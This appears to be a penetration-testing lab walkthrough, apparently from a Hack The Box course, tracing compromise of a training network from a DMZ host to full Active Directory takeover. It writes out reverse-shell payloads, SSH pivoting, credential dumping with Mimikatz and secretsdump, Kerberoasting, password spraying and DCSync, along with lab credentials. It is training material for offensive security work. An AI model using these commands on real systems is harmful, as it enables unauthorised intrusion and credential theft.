
                User srvadm may run the following commands on dmz01:
        (ALL) NOPASSWD: /usr/bin/openssl


        there is a GTFOBin for the OpenSSL binary. The entry shows various ways this can be leveraged: to upload and download files, gain a reverse shell, and read and write files.Let's try this to see if we can grab the SSH private key for the root user. 

        srvadm@dmz01:~$ LFILE=/root/.ssh/id_rsa
        srvadm@dmz01:~$ sudo /usr/bin/openssl enc -in $LFILE


        -Establishing Persistence
        

        Success! We can now save the private key to our local system, modify the privileges, and use it to SSH as root and confirm root privileges.

        $ chmod 600 dmz01_key 
        $ ssh -i dmz01_key root@10.129.203.111




                        //Setting Up Pivoting - SSH

        
        With a copy of the root id_rsa (private key) file, we can use SSH port forwarding along with ProxyChains to start getting a picture of the internal network. 

        We can use the following command to set up our SSH pivot using dynamic port forwarding: ssh -D 8081 -i dmz01_key root@10.129.x.x. This means we can proxy traffic from our attack host through port 8081 on the target to reach hosts inside the 172.16.8.0/23 subnet directly from our attack host.

        Gkaranikas@htb[/htb]$ ssh -D 8081 -i id_rsa root@10.129.203.111

        We can confirm that the dynamic port forward is set up using Netstat 

        $ netstat -antp | grep 8081

        Next, we need to modify the /etc/proxychains.conf to use the port we specified with our dynamic port forwarding command (8081 here).

        Gkaranikas@htb[/htb]$ grep socks4 /etc/proxychains.conf 

        
        #	 	socks4	192.168.1.49	1080
        #       proxy types: http, socks4, socks5
        socks4 	127.0.0.1 8081

        Next, we can use Nmap with Proxychains to scan the dmz01 host on its' second NIC, with the IP address 172.16.8.120 to ensure everything is set up correctly.

        $ proxychains nmap -sT -p 21,22,80,8080 172.16.8.120



                        //Setting Up Pivoting - Metasploit

        
        Alternatively, we can set up our pivoting using Metasploit

        First, generate a reverse shell in Elf format using msfvenom.

        $ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=443 -f elf > shell.elf

        Next, transfer the host to the target. Since we have SSH, we can upload it to the target using SCP.

        Gkaranikas@htb[/htb]$ scp -i dmz01_key shell.elf root@10.129.203.111:/tmp

        Now, we'll set up the Metasploit exploit/multi/handler.

        Execute the shell.elf file on the target system

        If all goes as planned, we'll catch the Meterpreter shell using the multi/handler, and then we can set up routes.

        Next, we can set up routing using the post/multi/manage/autoroute module.

        [msf](Jobs:0 Agents:1) exploit(multi/handler) >> use post/multi/manage/autoroute 

        [msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> set SESSION 1

        [msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> set subnet 172.16.8.0

        [msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> run

        
        
        -Host Discovery - 172.16.8.0/23 Subnet - Metasploit


        [msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> use post/multi/gather/ping_sweep

        [msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> set rhosts 172.16.8.0/23

        [msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> set SESSION 1

        [msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> run




                        //Host Discovery - 172.16.8.0/23 Subnet - SSH Tunnel

        
        root@dmz01:~# for i in $(seq 254); do ping 172.16.8.$i -c1 -W1 & done | grep from

        We could also use Nmap through Proxchains to enumerate hosts in the 172.16.8.0/23 subnet, but it will be very slow and take ages to finish.



                        /Host Enumeration

        
        Let's continue our enumeration using a static Nmap binary from the dmz01 host. Try uploading the binary

        root@dmz01:/tmp# ./nmap --open -iL live_hosts 

        Nmap scan report for 172.16.8.3
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00064s latency).
Not shown: 1173 closed ports
PORT    STATE SERVICE
53/tcp  open  domain
88/tcp  open  kerberos
135/tcp open  epmap
139/tcp open  netbios-ssn
389/tcp open  ldap
445/tcp open  microsoft-ds
464/tcp open  kpasswd
593/tcp open  unknown
636/tcp open  ldaps
MAC Address: 00:50:56:B9:16:51 (Unknown)

Nmap scan report for 172.16.8.20
Host is up (0.00037s latency).
Not shown: 1175 closed ports
PORT     STATE SERVICE
80/tcp   open  http
111/tcp  open  sunrpc
135/tcp  open  epmap
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs
3389/tcp open  ms-wbt-server
MAC Address: 00:50:56:B9:EC:36 (Unknown)

Nmap scan report for 172.16.8.50
Host is up (0.00038s latency).
Not shown: 1177 closed ports
PORT     STATE SERVICE
135/tcp  open  epmap
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
8080/tcp open  http-alt
MAC Address: 00:50:56:B9:B0:89 (Unknown)


        From the Nmap output, we can gather the following:

    172.16.8.3 is a Domain Controller because we see open ports such as Kerberos and LDAP. We can likely leave this to the side for now as its unlikely to be directly exploitable (though we can come back to that)
    
    172.16.8.20 is a Windows host, and the ports 80/HTTP and 2049/NFS are particularly interesting
    
    172.16.8.50 is a Windows host as well, and port 8080 sticks out as non-standard and interesting



                        //Active Directory Quick Hits - SMB NULL SESSION
        

        We can quickly check against the Domain Controller for SMB NULL sessions. If we can dump the password policy and a user list, we could try a measured password spraying attack. If we know the password policy, we can time our attacks appropriately to avoid account lockout. If we can't find anything else, we could come back and use Kerbrute to enumerate valid usernames from various user lists and after enumerating (during a real pentest) potential usernames from the company's LinkedIn page. With this list in hand, we could try 1-2 spraying attacks and hope for a hit. If that still does not work, depending on the client and assessment type, we could ask them for the password policy to avoid locking out accounts. We could also try an ASREPRoasting attack if we have valid usernames, as discussed in the Active Directory Enumeration & Attacks module.


        Gkaranikas@htb[/htb]$ proxychains enum4linux -U -P 172.16.8.3

        Unfortunately for us, this is a dead-end.



                        /172.16.8.50 - Tomcat


        Our earlier Nmap scan showed port 8080 open on this host. Browsing to http://172.16.8.50:8080 shows the latest version of Tomcat 10 installed. Though there are no public exploits for it, we can try to brute-force the Tomcat Manager login as shown in the Attacking Tomcat section of the Attacking Common Applications module. We can start another instance of Metasploit using Proxychains by typing proxychains msfconsole to be able to pivot through the compromised dmz01 host if we don't have routing set up via a Meterpreter session. We can then use the auxiliary/scanner/http/tomcat_mgr_login module to attempt to brute-force the login.


        msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 172.16.8.50

        msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true

        msf6 auxiliary(scanner/http/tomcat_mgr_login) > run

        We do not get a successful login, so this appears to be a dead-end and not worth exploring further.




                        /Enumerating 172.16.8.20 - DotNetNuke (DNN)

        
        From the Nmap scan, we saw ports 80 and 2049 open. Let's dig into each of these. We can check out what's on port 80 using cURL from our attack host using the command proxychains curl http://172.16.8.20. From the HTTP response, it looks like DotNetNuke (DNN) is running on the target. This is a CMS written in .NET, basically the WordPress of .NET. It has suffered from a few critical flaws over the years and also has some built-in functionality that we may be able to take advantage of. We can confirm this by browsing directly to the target from our attack host, passing the traffic through the SOCKS proxy.

        Browsing to http://172.16.8.20/Login?returnurl=%2fadmin shows us the admin login page. There is also a page to register a user. We attempt to register an account but receive the message:

        An email with your details has been sent to the Site Administrator for verification. You will be notified by email when your registration has been approved. In the meantime you can continue to browse this site.

        -172.16.8.29   /nfs port

        Putting DNN aside, for now, we go back to our port scan results. Port 2049, NFS, is always interesting to see. If the NFS server is misconfigured (which they often are internally), we can browse NFS shares and potentially uncover some sensitive data.As this is a development server (due to the in-process DNN installation and the DEV01 hostname) so it's worth digging into. We can use showmount to list exports, which we may be able to mount and browse similar to any other file share. We find one export, DEV01, that is accessible to everyone (anonymous access). Let's see what it holds.


        Gkaranikas@htb[/htb]$ proxychains showmount -e 172.16.8.20


        We can't mount the NFS share through Proxychains, but luckily we have root access to the dmz01 host to try. We see a few files related to DNN and a DNN subdirectory.

        root@dmz01:/tmp# mkdir DEV01
        root@dmz01:/tmp# mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01
        root@dmz01:/tmp# cd DEV01/
        root@dmz01:/tmp/DEV01# ls

        The DNN subdirectory is very interesting as it contains a web.config file. From our discussions on pillaging throughout the Penetration Tester Path, we know that config files can often contain credentials, making them a key target during any assessment.

        Checking the contents of the web.config file, we find what appears to be the administrator password for the DNN instance.


        root@dmz01:/tmp/DEV01/DNN# cat web.config 


        ...
         <username>Administrator</username>
        <password>
                <value>D0tn31Nuk3R0ck$$@123</value>
        </password>
        <system.web>

        ...


        Before we move on, since we have root access on dmz01 via SSH, we can run tcpdump as it's on the system. It can never hurt to "listen on the wire" whenever possible during a pentest and see if we can grab any cleartext credentials or generally uncover any additional information that may be useful for us. We'll typically do this during an Internal Penetration Test when we have our own physical laptop or a VM that we control inside the client's network. Some testers will run a packet capture the entire time (rarely, clients will even request this), while others will run it periodically during the first day or so to see if they can capture anything.

        root@dmz01:/tmp# tcpdump -i ens192 -s 65535 -w ilfreight_pcap




                        //Attacking DNN
                
        
        Let's head over to DNN and try our luck with the credential pair Administrator:D0tn31Nuk3R0ck$$@123. This is a success; we are logged in as the SuperUser administrator account. Here we would want to record another two high-risk findings: Insecure File Shares and Sensitive Data on File Shares. We could potentially combine these into one, but it's worth highlighting as separate issues because if the client restricts anonymous access, but all Domain Users can still access the share and see data that is not necessary for their day-to-day work, then there is a still a risk present.


        A SQL console is accessible under the Settings page where we can enable xp_cmdshell and run operating system commands. We can first enable this by pasting these lines into the console one by one and clicking Run Script. We won't get any output from each command, but no errors typically means it's working.

        EXEC sp_configure 'show advanced options', '1'
        RECONFIGURE
        EXEC sp_configure 'xp_cmdshell', '1' 
        RECONFIGURE
        
        If this works, we can run operating system commands in the format xp_cmdshell '<command here>'. We could then use this to obtain a reverse shell or work on privilege escalation.

        What's also interesting about DNN is we can change the allowable file extensions to allow .asp and .aspx files to be uploaded. This is useful if we cannot gain RCE via the SQL console. If this is successful, we can upload an ASP web shell and gain remote code execution on the DEV01 server. The allowed file extensions list can be modified to include .asp and .aspx by browsing to Settings -> Security -> More -> More Security Settings and adding them under Allowable File Extensions, and clicking the Save button. Once this is done, we can upload an ASP webshell after browsing to http://172.16.8.20/admin/file-management. Click the upload files button and select the ASP web shell we downloaded to our attack host.

        Once uploaded, we can right-click on the uploaded file and select Get URL. The resultant URL will allow us to run commands via the web shell, where we could then work to get a reverse shell or perform privilege escalation steps, as we'll see next.




        --Privilege Escalation


        Next, we need to escalate privileges. In the command output above, we saw that we have SeImpersonate privileges. Following the steps in the SeImpersonate and SeAssignPrimaryToken section in the Windows Privilege Escalation module, we can work to escalate our privileges to SYSTEM, which will result in an initial foothold in the Active Directory (AD) domain and allow us to begin enumerating AD.



        We'll try escalating privileges using the PrintSpoofer tool and then see if we can dump any useful credentials from the host's memory or registry. We'll need nc.exe on the DEV01 host to send ourselves a shell and the PrintSpoofer64.exe binary to leverage SeImpersonate privileges. There are a few ways we can transfer them up there. We could use the dmz01 host as a "jump host" and transfer our tools through it via SCP and then start a Python3 web server and download them onto the DEV01 host using certutil.


        An easier way would be to modify the DNN Allowable File Extensions once again to allow the .exe file format. We can then upload both of these files and confirm via our shell that they are located in c:\DotNetNuke\Portals\0.

        Once uploaded, we can start a Netcat listener on the dmz01 host and run the following command to obtain a reverse shell as NT AUTHORITY\SYSTEM:

        c:\DotNetNuke\Portals\0\PrintSpoofer64.exe -c "c:\DotNetNuke\Portals\0\nc.exe 172.16.8.120 443 -e cmd"

        From here, we can perform some post-exploitation and manually retrieve the contents of the SAM database and with it, the local administrator password hash.


        c:\DotNetNuke\Portals\0> reg save HKLM\SYSTEM SYSTEM.SAVE

         c:\DotNetNuke\Portals\0> reg save HKLM\SECURITY SECURITY.SAVE

         c:\DotNetNuke\Portals\0> reg save HKLM\SAM SAM.SAVE

         Now we can once again modify the allowed file extensions to permit us to down the .SAVE files. Next, we can go back to the File Management page and download each of the three files to our attack host.


        
        Finally, we can use secretsdump to dump the SAM database and retrieve a set of credentials from LSA secrets.

        Gkaranikas@htb[/htb]$ secretsdump.py LOCAL -system SYSTEM.SAVE -sam SAM.SAVE -security SECURITY.SAVE

        We confirm that these credentials work using CrackMapExec and we now have a way back to this system should we lose our reverse shell.

        $ proxychains crackmapexec smb 172.16.8.20 --local-auth -u administrator -H <redacted>

        From the secretsdump output above, we notice a cleartext password, but it's not immediately apparent which user it's for. We could dump LSA again using CrackMapExec and confirm that the password is for the hporter user.

        We now have our first set of domain credentials for the INLANEFREIGHT.LOCAL domain, hporter:Gr8hambino!. We can confirm this from our reverse shell on dmz01.

        c:\DotNetNuke\Portals\0> net user hporter /dom

        We could also escalate privileges on the DEV01 host using the PrintNightmare vulnerability. There are also other ways to retrieve the credentials, such as using Mimikatz. Play around with this machine and apply the various skills you learned in the Penetration Tester Path to perform these steps in as many ways as possible to practice and find what works best for you.





                        /Alternate Method - Reverse Port Forwarding

        
        There are many ways to attack this network and achieve the same results, so we will not cover them all here, but one worth mentioning is Remote/Reverse Port Forwarding with SSH. Let's say we want to return a reverse shell from the DEV01 box to our attack host. We can't do this directly since we're not in the same network, but we can leverage dmz01 to perform reverse port forwarding and achieve our goal. We may want to get a Meterpreter shell on the target or a reverse shell directly for any number of reasons. We could have also performed all of these actions without ever getting a shell, as we could have used PrintSpoofer to add a local admin or dump credentials from DEV01 and then connect to the host in any number of ways from our attack host using Proxychains (pass-the-hash, RDP, WinRM, etc.). See how many ways you can achieve the same task of interacting with the DEV01 host directly from your attack host. It's essential to be versatile, and this lab network is a great place to practice as many techniques as possible and hone our skills.


        Let's walk through the reverse port forwarding method quickly. First off, we need to generate a payload using msfvenom. Note that here we'll specify the IP address of the dmz01 pivot host in the lhost field and NOT our attack host IP as the target would not be able to connect back to us directly.

        Gkaranikas@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https lhost=172.16.8.120 -f exe -o teams.exe LPORT=443

        Next, we need to set up a multi/handler and start a listener on a different port than the payload we generated will use.

        [msf](Jobs:0 Agents:0) exploit(windows/smb/smb_delivery) >> use multi/handler

        [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload windows/x64/meterpreter/reverse_https

        [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost tun0

        [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lport 7000

        [msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

        [*] Started HTTPS reverse handler on https://0.0.0.0:7000


        Next, we need to upload the teams.exe reverse shell payload to the DEV01 target host. We can SCP it up to dmz01, start a Python web server on that host and then download the file. Alternatively, we can use the DNN file manager to upload the file as we did previously. With the payload on the target, we need to set up SSH remote port forwarding to forward the Metasploit listener port 8000 to port 8180 on the dmz01 pivot box. The R flag tells the pivot host to listen on port 8180 and forward all incoming traffic to this port to our Metasploit listener at 0.0.0.0:8000 configured on our attack host.


        $ ssh -i dmz01_key -R 172.16.8.120:443:0.0.0.0:7000 root@10.129.203.111 -vN


        Next, execute the teams.exe payload from the DEV01 host, and if all goes to plan, we'll get a connection back.

        A caveat to the above method is that, by default, OpenSSH only allows connection to remote forwarded ports from the server itself (localhost). To allow this, we must edit the /etc/ssh/sshd_config file on Ubuntu systems and change the line GatewayPorts no to GatewayPorts yes, otherwise we will not be able to get a call back on the port we forwarded in the SSH command (port 443 in our case). To do this, we would need root SSH access to the host we are using to pivot from. At times we will see this configuration set up like this, so it works straight away, but if we don't have root access to the host with the ability to temporarily modify the SSH config file (and reload it to take effect using service sshd reload), then we won't be able to perform port forwarding in this way. Keep in mind that this type of change opens up a security hole in the client's system, so you'd want to clear it with them, note down the change, and make every effort to revert it at the end of testing. This post is worth reading to understand SSH Remote Forwarding better.





                        //Lateral Movement


        
        After pillaging the host DEV01, we found the following set of credentials by dumping LSA secrets:

        hporter:Gr8hambino!


        We'll use the SharpHound collector to enumerate all possible AD objects and then ingest the data into the BloodHound GUI for review. We can download the executable (though in a real-world assessment, it's best to compile our own tools) and use the handy DNN file manager to upload it to the target. We want to gather as much data as possible and don't have to worry about evasion, so we'll use the -c All flag to use all collection methods.

        c:\DotNetNuke\Portals\0> SharpHound.exe -c All

        This will generate a tidy Zip file that we can download via the DNN file management tool again . Next, we can start the neo4j service (sudo neo4j start), type bloodhound to open the GUI tool, and ingest the data.

        Searching for our user hporter and selecting First Degree Object Control, we can see that the user has ForceChangePassword rights over the ssmalls user.

        As an aside, we can see that all Domain Users have RDP access over the DEV01 host. This means that any user in the domain can RDP in and, if they can escalate privileges, could potentially steal sensitive data such as credentials. This is worth noting as a finding; we can call it Excessive Active Directory Group Privileges and label it medium-risk. If the entire group had local admin rights over a host, it would definitely be a high-risk finding.

        We can use PowerView to change the ssmalls user's password. Let's RDP to the target after checking to ensure the port is open. RDP will make it easier for us to interact with the domain via a PowerShell console, though we could still do this via our reverse shell access.

        To achieve this, we can use another SSH port forwarding command, this type Local Port Forwarding. The command allows us to pass all RDP traffic to DEV01 through the dmz01 host via local port 13389.

        ssh -i dmz01_key -L 13389:172.16.8.20:3389 root@10.129.203.111

        Once this port forward is set up, we can use xfreerdp to connect to the host using drive redirection to transfer files back and forth easily.

        xfreerdp /v:127.0.0.1:13389 /u:hporter /p:Gr8hambino! /drive:home,"/home/tester/tools"


        We notice that we only get console access as this server does not have the the Desktop Experience role installed, but all we need is a console. We can type net use to view the location of our redirected drive and then transfer the tool over.

        c:\DotNetNuke\Portals\0> net use

        c:\DotNetNuke\Portals\0> copy \\TSCLIENT\home\PowerView.ps1 .

        Next, type powershell to drop into a PowerShell console, and we can use PowerView to change the ssmalls user's password as follows:
        
        PS C:\DotNetNuke\Portals\0> Import-Module .\PowerView.ps1

        PS C:\DotNetNuke\Portals\0> Set-DomainUserPassword -Identity ssmalls -AccountPassword (ConvertTo-SecureString 'Str0ngpass86!' -AsPlainText -Force ) -Verbose


        We can switch back to our attack host and confirm that the password was changed successfully. Generally, we would want to avoid this type of activity during a penetration test, but if it's our only path, we should confirm with our client. Most will ask us to proceed so they can see how far the path will take us, but it's always best to ask. We want to, of course, note down any changes like this in our activity log so we can include them in an appendix of our report.


        Gkaranikas@htb[/htb]$ proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86!



                        //Share Hunting

        Digging around the host and AD some more, we don't see much of anything useful. BloodHound does not show anything interesting for the ssmalls user. Turning back to the Penetration Tester Path content, we remember that both the Credentialed Enumeration from Windows and the Credentialed Enumeration from Linux sections covered hunting file shares with Snaffler and CrackMapExec respectively. There have been many times on penetration tests where I have had to turn to digging through file shares to find a piece of information, such as a password for a service account or similar. I have often been able to access departmental shares (such as IT) with low privileged credentials due to weak NTFS permissions. Sometimes I can even access shares for some or all users in the target company due to the same issue. Frequently users are unaware that their home drive is a mapped network share and not a local folder on their computer, so they may save all sorts of sensitive data there. File share permissions are very difficult to maintain, especially in large organizations. 


        A tool like Snaffler can help us navigate that and focus on the most important files and scripts. Let's try that here.

        c:\DotNetNuke\Portals\0> copy \\TSCLIENT\home\Snaffler.exe

        This doesn't turn up anything interesting, so let's re-run our share enumeration as the ssmalls user. Users can often have different permissions, so share enumeration should be considered an iterative process. To avoid having to RDP again, we can use the CrackMapExec spider_plus module to dig around.

        Gkaranikas@htb[/htb]$ proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M spider_plus --share 'Department Shares'

        This creates a file for us in our /tmp directory so let's look through it.

        $ cat 172.16.8.3.json 


        The file SQL Express Backup.ps1 in the private IT share looks very interesting. Let's download it using smbclient. First, we need to connect.

        Gkaranikas@htb[/htb]$ proxychains smbclient -U ssmalls '//172.16.8.3/Department Shares' 

        Checking out the file, we see that it's some sort of backup script with hardcoded credentials for the backupadm, another keyboard walk password. I'm noticing a trend in this organization. Perhaps the same admin set it as the one that set the password we brute-forced with Hydra earlier since this is related to development.

        Before trying to use this account somewhere, let's dig around a bit more. There is an interesting .vbs file on the SYSVOL share, which is accessible to all Domain Users.

        We can download it once again with smbclient.

        Gkaranikas@htb[/htb]$ proxychains smbclient -U ssmalls '//172.16.8.3/sysvol' 

        Digging through the script we find another set of credentials: helpdesk:L337^p@$$w0rD

        Checking in BloodHound, we do not find a helpdesk user, so this may just be an old password. Based on the year in the script comments, it likely is. We can still add this to our findings regarding sensitive data on file shares and note it down in the credentials section of our project notes. Sometimes we will find old passwords that are still being used for old service accounts that we can use for a password spraying attack.




                        //Kerberoasting

        
        To cover all our bases, let's check if there are any Kerberoastable users. We can do this via Proxychains using GetUserSPNs.py or PowerView. In our RDP session, we'll load PowerView and enumerate Service Principal Name (SPN) accounts.


        PS C:\DotNetNuke\Portals\0> Import-Module .\PowerView.ps1
        
        PS C:\DotNetNuke\Portals\0> Get-DomainUser * -SPN |Select samaccountname

        There are quite a few. Let's export these to a CSV file for offline processing.

        
        PS C:\DotNetNuke\Portals\0> Get-DomainUser * -SPN -verbose |  Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation


        We can download this file via the RDP drive redirection we set up earlier: copy .\ilfreight_spns.csv \\Tsclient\Home. Open up the .csv file using LibreOffice Calc or Excel and pull out the hashes and add them to a file. We can now run them through Hashcat to see if we can crack any and, if so, if they are for privileged accounts.

        Gkaranikas@htb[/htb]$ hashcat -m 13100 ilfreight_spns /usr/share/wordlists/rockyou.txt



        One hash cracks, but checking in BloodHound, the account does not seem to be helpful to us. We can still note down another finding for Weak Kerberos Authentication Configuration (Kerberoasting) and move on.





                        <!-- //Password Spraying -->

        
        Another lateral movement technique worth exploring is Password Spraying. We can use DomainPasswordSpray.ps1 or the Windows version of Kerbrute from the DEV01 host or use Kerbrute from our attack host via Proxychains (all worth playing around with).

        PS C:\DotNetNuke\Portals\0> Invoke-DomainPasswordSpray -Password Welcome1

        We find a valid password for two more users, but neither has interesting access. It's still worth noting down a finding for Weak Active Directory Passwords allowed and moving on.



                        //Misc Techniques
        
        Let's try a few more things to cover all our bases. We can search the SYSVOL share for Registry.xml files that may contain passwords for users configured with autologon via Group Policy.


        Gkaranikas@htb[/htb]$ proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M gpp_autologin

        This doesn't turn up anything useful. Moving on, we can search for passwords in user Description fields in AD, which is not overly common, but we still see it from time to time (I have even seen Domain and Enterprise Admin account passwords here!).

        PS C:\DotNetNuke\Portals\0> Get-DomainUser * |select samaccountname,description | ?{$_.Description -ne $null}

        We find one for the account frontdesk, but this one isn't useful either. It's worth noting that there are many multiple ways to obtain a user account password in this domain, and there is the one host with RDP privileges granted to all Domain Users. Though these accounts do not have any special rights, it would be a client fixing these issues because an attacker often only needs one password to be successful in AD. Here we can note down a finding for Passwords in AD User Description Field and continue onwards.



                        <!-- Next Steps -->


        At this point, we have dug into the domain pretty heavily and have found several sets of credentials but hit a bit of a brick wall. Going back to the basics, we can run a scan to see if any hosts have WinRM enabled and attempt to connect with each set of credentials.

        Gkaranikas@htb[/htb]$ proxychains nmap -sT -p 5985 172.16.8.50

        The host 172.16.8.50, or MS01 is the only one left that we haven't gotten into aside from the Domain Controller, so let's give it a try using evil-winrm and the credentials for the backupadm user.

        It works, and we're in!

        Gkaranikas@htb[/htb]$ proxychains evil-winrm -i 172.16.8.50 -u backupadm 

        At this point, we could use this evil-winrm shell to further enumerate the domain with a tool such as PowerView. Keep in mind that we'll need to use a PSCredential object to perform enumeration from this shell due to the Kerberos "Double Hop" problem. Practice this technique and see what other AD enumeration tools you may be able to use in this way.

        Back to the task at hand. Our user is not a local admin, and whoami /priv does not turn up any useful privileges. Looking through the Windows Privilege Escalation module, we don't find much interesting so let's hunt for credentials. After some digging around, we find an unattend.xml file leftover from a previous installation.

        *Evil-WinRM* PS C:\panther> type unattend.xml

        We find credentials for the local user ilfserveradm, with the password Sys26Admin.

        *Evil-WinRM* PS C:\panther> net user ilfserveradm

        This isn't a domain user, but it's interesting that this user has Remote Desktop access but is not a member of the local admins group. Let's RDP in and see what we can do. After RDPing in and performing additional enumeration, we find some non-standard software installed in the C:\Program Files (x86)\SysaxAutomation directory. A quick search yields this (  https://www.exploit-db.com/exploits/50834   )local privilege escalation exploit. According to the write-up, this Sysax Scheduled Service runs as the local SYSTEM account and allows users to create and run backup jobs. If the option to run as a user is removed, it will default to running the task as the SYSTEM account. Let's test it out!



        First, create a file called pwn.bat in C:\Users\ilfserveradm\Documents containing the line net localgroup administrators ilfserveradm /add to add our user to the local admins group (sometime we'd need to clean up and note down in our report appendices). Next, we can perform the following steps:



                Open C:\Program Files (x86)\SysaxAutomation\sysaxschedscp.exe
               
                Select Setup Scheduled/Triggered Tasks
                
                Add task (Triggered)
                
                Update folder to monitor to be C:\Users\ilfserveradm\Documents
               
                Check Run task if a file is added to the monitor folder or subfolder(s)
                
                Choose Run any other Program and choose C:\Users\ilfserveradm\Documents\pwn.bat
               
                Uncheck Login as the following user to run task
               
                Click Finish and then Save


        
        Finally, to trigger the task, create a new .txt file in the C:\Users\ilfserveradm\Documents directory. We can check and see that the ilfserveradm user was added to the Administrators group.

        C:\Users\ilfserveradm> net localgroup administrators




                        //Post-Exploitation/Pillaging

        


        Next, we'll perform some post-exploitation on the MS01 host. We do see a couple of interesting files in the root of the c:\ drive named budget_data.xlsx and Inlanefreight.kdbx that would be worth looking into and potentially reporting to the client if they are not in their intended location. Next, we can use Mimikatz, elevate to an NT AUTHORITY\SYSTEM token and dump LSA secrets.

        c:\Users\ilfserveradm\Documents> mimikatz.exe

        mimikatz # log

        mimikatz # privilege::debug

        mimikatz # lsadump::secrets

        mimikatz # token::elevate

        mimikatz # lsadump::secrets
        
        We find a set password but no associated username. This appears to be for an account configured with autologon, so we can query the Registry to find the username.

        PS C:\Users\ilfserveradm> Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\' -Name "DefaultUserName"

        Now we have a new credential pair: mssqladm:DBAilfreight1!.

        Before we move on, let's check for any other credentials. We see Firefox installed, so we can grab the LaZagne tool to try to dump any credentials saved in the browser. No luck, but always worth a check.

        c:\Users\ilfserveradm\Documents> lazagne.exe browsers -firefox

        It's also worth running Inveigh once we have local admin on a host to see if we can obtain password hashes for any users.

        PS C:\Users\ilfserveradm\Documents> Import-Module .\Inveigh.ps1
        
        PS C:\Users\ilfserveradm\Documents> Invoke-Inveigh -ConsoleOutput Y -FileOutput Y      


        

                        //Active Directory Compromise


        To recap, we dug through the Active Directory environment and obtained the following credential pair:

        mssqladm:DBAilfreight1!

        Digging into the BloodHound data we see that we have GenericWrite over the ttimmons user. Using this we can set a fake SPN on the ttimmons account and perform a targeted Kerberoasting attack. If this user is using a weak password then we can crack it and proceed onwards.



        -Setting SPN to ttimmons

        Let's go back to the DEV01 machine where we had loaded PowerView. We can create a PSCredential object to be able to run commands as the mssqladm user without having to RDP again.

        PS C:\DotNetNuke\Portals\0> $SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force

        PS C:\DotNetNuke\Portals\0> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)


        
        Next we'll use Set-DomainObject to set a fake SPN on the target account. We'll create an SPN named acmetesting/LEGIT which we'll of course delete later and note in the appendices of our report.


        PS C:\DotNetNuke\Portals\0> Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose


        -KErberoasting ttimmons

        Next we can go back to our attack host and use GetUserSPNs.py to perform a targeted Keberoasting attack.

        Gkaranikas@htb[/htb]$ proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons

        $ hashcat -m 13100 ttimmons_tgs /usr/share/wordlists/rockyou.txt

        They are! Now we have yet another credential pair, time for the ttimmons user. Let's check and see what type of access this user has. Looking in BloodHound again we see that we have GenericAll over the SERVER ADMINS group.

        
        
        
        -adding timmons to SERVER ADMINS
        
        Looking a bit further we see that the SERVER ADMINS group has the ability to perform the DCSync attack to obtain NTLM password hashes for any users in the domain.

        We use abuse this by first adding the ttimmons user to the group. First we'll need to create another PSCredential object.

        
        PS C:\htb> PS C:\DotNetNuke\Portals\0> $timpass = ConvertTo-SecureString '<PASSWORD REDACTED>' -AsPlainText -Force

        PS C:\DotNetNuke\Portals\0> $timcreds = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\ttimmons', $timpass)


        $group = Convert-NameToSid "Server Admins"

        Add-DomainGroupMember -Identity $group -Members 'ttimmons' -Credential $timcreds -verbose


        -DCSyncing

        Finally, we can use Secretsdump to DCSync all NTLM password hashes from the Domain Controller.


        Gkaranikas@htb[/htb]$ proxychains secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm

        


                        //Post-Exploitation

        
        Once we've compromised the domain, depending on the assessment type, our work is not over. There are many things we can do to add additional value to our clients. If the goal of the assessment was to reach Domain Admin and nothing further, then we are done and should make sure we have all of our command/log output, scan data, and screenshots and continue drafting the report. If the assessment was goal focused (i.e., gain access to a specific database) we should continue working towards that goal. Domain Admin rights may be just the start as there could be other networks, domains, or forests in play that we will need to find our way into. If the assessment is more open ended and the client asked us to demonstrate as much impact as possible there are quite a few things we can do to add value and help them improve their security posture.




        -Domain Password Analysis - Cracking NTDS



        After we have dumped the NTDS database we can perform offline password cracking with Hashcat. Once we've exhausted all possible rules and wordlists on our cracking rig we should use a tool such as DPAT to perform a domain password analysis. This can nicely compliment findings such as Weak Active Directory Passwords Allowed, which we noted down after a successful password spraying attack earlier. This analysis can help drive the point home and can be a power visual. Our analysis can be included in the appendices of the report with metrics such as:

        Number of password hashes obtained
        
        Number of password hashes cracked
        
        Percent of password hashes cracked
        
        Top 10 passwords
        
        Password length breakdown
        
        Number of Domain Admin passwords cracked
        
        Number of Enterprise Admin passwords cracked



        -Active Directory Security Audit

